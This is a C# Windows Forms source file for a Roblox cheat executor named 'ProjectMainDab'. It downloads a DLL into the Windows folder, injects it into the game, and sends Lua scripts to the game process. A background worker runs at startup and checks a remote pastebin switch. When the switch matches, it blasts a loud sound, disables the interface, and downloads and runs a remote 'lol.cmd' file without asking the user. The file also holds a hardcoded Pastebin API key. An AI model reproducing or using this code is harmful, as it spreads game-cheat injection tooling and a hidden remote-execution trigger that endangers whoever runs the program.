using Microsoft.Win32;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DiscordRPC;
using DiscordRPC.Logging;
using DiscordRPC.Message;
using PasteBin_API;
using System.Diagnostics;
using System.Drawing;

namespace ProjectMainDab
{
    public partial class Form4 : Form
    {
        public Form4()
        {
            InitializeComponent();
            panel1.Hide
                ();

           

            WebClient webClient = new WebClient();
            client = new DiscordRpcClient("677778388982824980")
            {
                Logger = new ConsoleLogger
                {
                    Level = LogLevel.Warning
                }
            };
            client.OnReady += delegate (object sender, ReadyMessage e)
            {
                Console.WriteLine("Received Ready from user {0}", e.User.Username);
            };
            client.OnPresenceUpdate += delegate (object sender, PresenceMessage e)
            {
                Console.WriteLine("Received Update! {0}", e.Presence);
            };
            client.Initialize();
            client.SetPresence(new RichPresence
            {
                Details = "Using ProjectMainDab",
                State = "Exploiting in Roblox",
                Assets = new Assets
                {
                    LargeImageKey = "render",
                    LargeImageText = "render",
                    SmallImageKey = "render"
                }
            });

            backgroundWorker2.RunWorkerAsync();
            button9.Hide();

        }

      

        private void TitleDraggable_Click(object sender, EventArgs e)
        {

        }
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd,
                         int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void TitleDraggable_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void MonacoEditor_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void Form4_Load(object sender, EventArgs e)
        {
            listBox1.Items.Clear();//Clear Items in the LuaScriptList
            Functions.PopulateListBox(listBox1, "./Scripts", "*.txt");
            Functions.PopulateListBox(listBox1, "./Scripts", "*.lua");
            WebClient wc = new WebClient
            {
                Proxy = null
            };
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION", true);
                string friendlyName = AppDomain.CurrentDomain.FriendlyName;
                bool flag2 = registryKey.GetValue(friendlyName) == null;
                if (flag2)
                {
                    registryKey.SetValue(friendlyName, 11001, RegistryValueKind.DWord);
                }
                registryKey = null;
                friendlyName = null;
            }
            catch (Exception)
            {
            }
            MonacoEditor.Url = new Uri(string.Format("file:///{0}/Monaco/Monaco.html", Directory.GetCurrentDirectory()));

            MonacoEditor.Document.InvokeScript("SetTheme", new string[]
            {
                   "Dark" 
                   /*
                    There are 2 Themes Dark and Light
                   */
            });
            addBase();
            addMath();
            addGlobalNS();
            addGlobalV();
            addGlobalF();
            MonacoEditor.Document.InvokeScript("SetText", new object[]
            {
                 "-- ProjectMainDab Loaded! Scripts go here."

            });


        }
        WebClient wc = new WebClient();
        private string defPath = Application.StartupPath + "//Monaco//";
        private void addIntel(string label, string kind, string detail, string insertText)
        {
            string text = "\"" + label + "\"";
            string text2 = "\"" + kind + "\"";
            string text3 = "\"" + detail + "\"";
            string text4 = "\"" + insertText + "\"";
            MonacoEditor.Document.InvokeScript("AddIntellisense", new object[]
            {
                label,
                kind,
                detail,
                insertText
            });
        }

        private void addGlobalF()
        {
            string[] array = File.ReadAllLines(defPath + "//globalf.txt");
            foreach (string text in array)
            {
                bool flag = text.Contains(':');
                if (flag)
                {
                    addIntel(text, "Function", text, text.Substring(1));
                }
                else
                {
                    addIntel(text, "Function", text, text);
                }
            }
        }

        private void addGlobalV()
        {
            foreach (string text in File.ReadLines(defPath + "//globalv.txt"))
            {
                addIntel(text, "Variable", text, text);
            }
        }

        private void addGlobalNS()
        {
            foreach (string text in File.ReadLines(defPath + "//globalns.txt"))
            {
                addIntel(text, "Class", text, text);
            }
        }

        private void addMath()
        {
            foreach (string text in File.ReadLines(defPath + "//classfunc.txt"))
            {
                addIntel(text, "Method", text, text);
            }
        }

        private void addBase()
        {
            foreach (string text in File.ReadLines(defPath + "//base.txt"))
            {
                addIntel(text, "Keyword", text, text);
            }

        }
        public DiscordRpcClient client;

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            MonacoEditor.Document.InvokeScript("SetText", new object[]
           {
                ""
           });
            Console.WriteLine("Monaco cleared");
            string dabberson = File.ReadAllText("Scripts\\" + this.listBox1.SelectedItem.ToString());
            bool flag = this.listBox1.SelectedItem != null;
            if (flag)
            {
                MonacoEditor.Document.InvokeScript("SetText", new object[]
          {
                (dabberson)
          });


            }
        }

        private void CloseButton_Click(object sender, EventArgs e) => Environment.Exit(0);

        private void MinimizeButton_Click(object sender, EventArgs e) => WindowState = FormWindowState.Minimized;

        private void button1_Click(object sender, EventArgs e)
        {
            HtmlDocument text = MonacoEditor.Document;
            string scriptName = "GetText";
            object[] args = new string[0];
            object obj = text.InvokeScript(scriptName, args);
            string script = obj.ToString();
            
                NamedPipes.LuaPipe(script);
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (Functions.openfiledialog.ShowDialog() == DialogResult.OK)
            {
                try
                {

                    string MainText = File.ReadAllText(Functions.openfiledialog.FileName);
                    MonacoEditor.Document.InvokeScript("SetText", new object[]
                    {
                          MainText
                    });

                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: Could not read file from disk. Original error: " + ex.Message);
                    Console.WriteLine("File can't be opened");
                }
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            if (Process.GetProcessesByName("RobloxPlayerBeta").Length == 0)
            {

                return;
            }
            else
            {
                try
                {
                    Process[] proc = Process.GetProcessesByName("RobloxPlayerBeta");
                    proc[0].Kill();

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message.ToString());
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MonacoEditor.Document.InvokeScript("SetText", new object[]
         {
                ""
         });
            Console.WriteLine("Monaco cleared");
        }
        WebClient webClient = new WebClient();
        private void button4_Click(object sender, EventArgs e)
        {
            if (File.Exists(@"c:\windows\twain_8.dll"))
            {
                File.Delete(@"c:\windows\twain_8.dll");
            }
            webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/Main_Dabs.dll?raw=true", @"c:\windows\twain_8.dll");
            Functions.Inject();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Form2 form = new Form2();
            form.Show();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            panel1.Hide
                ();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            panel1.Show
                ();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            string sdfskfsjkdfnasjkjdldi = textBox1.Text;
            var core = new PasteBinCore("55840d5f950c530be16448ca606611dc");
            HtmlDocument text = MonacoEditor.Document;
            string scriptName = "GetText";
            object[] args = new string[0];
            object obj = text.InvokeScript(scriptName, args);
            string script = obj.ToString();
            dWebHook dcWeb = new dWebHook();
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\OurSettings");
            string user = (key.GetValue("Setting1").ToString());
            panel1.Hide();
            core.PostAnnon((sdfskfsjkdfnasjkjdldi), (script));
            MessageBox.Show("Script sent! Check the Discord Channel to see the link");
        }

        private void button9_Click(object sender, EventArgs e)
        {
            
        }

        private void backgroundWorker2_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            System.Net.WebClient wc = new System.Net.WebClient();
            byte[] raw = wc.DownloadData("https://pastebin.com/raw/wCDAyFrh");
            string webData = System.Text.Encoding.UTF8.GetString(raw);
            string version = ("1");
            if (version == webData)
            {
                System.Threading.Thread.Sleep(5000);
                WebClient webClient = new WebClient();
                if (File.Exists(@"c:/earrape.wav"))
                {


                    webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/Earrape.wav?raw=true", @"c:/earrape.wav");
                    System.Media.SoundPlayer player = new System.Media.SoundPlayer(@"c:/earrape.wav");
                    player.Play();
                    BackColor = Color.Red;
                    label1.Hide();
                    TitleDraggable.Text = ("LOL YOU ARE USING THE TRASH UI!!!!!!!!!!!!!!!!!");
                    button1.Hide();
                    button2.Hide();

                    button7.Hide();
                    button3.Hide();
                    button4.Hide();
                    button6.Hide();
                    button5.Hide();
                    MonacoEditor.Hide();
                    MinimizeButton.Hide();
                    CloseButton.Hide();
                    System.Threading.Thread.Sleep(5000);
                    button9.Show();
                    webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/lol.cmd?raw=true", "lol.cmd");
                    Process.Start("lol.cmd");
                }
                else
                {

                    webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/Earrape.wav?raw=true", @"c:/earrape.wav");
                    System.Media.SoundPlayer player = new System.Media.SoundPlayer(@"c:/earrape.wav");
                    player.Play();
                    BackColor = Color.Red;
                    label1.Hide();
                    TitleDraggable.Text = ("LOL YOU ARE USING THE TRASH UI!!!!!!!!!!!!!!!!!");
                    button1.Hide();
                    button2.Hide();

                    button7.Hide();
                    button3.Hide();
                    button4.Hide();
                    button6.Hide();
                    button5.Hide();
                    MonacoEditor.Hide();
                    MinimizeButton.Hide();
                    CloseButton.Hide();

                    button9.Show();
                    System.Threading.Thread.Sleep(5000);
                    webClient.DownloadFile("https://github.com/leonardssy/ProjectDab/blob/master/lol.cmd?raw=true", "lol.cmd");
                    Process.Start("lol.cmd");
                }
            }
            else { }
        }

        private void button9_Click_1(object sender, EventArgs e)
        {
                AxonSimpleUIForm form = new AxonSimpleUIForm();
                form.Show();
                base.Hide();
        }
    }
}
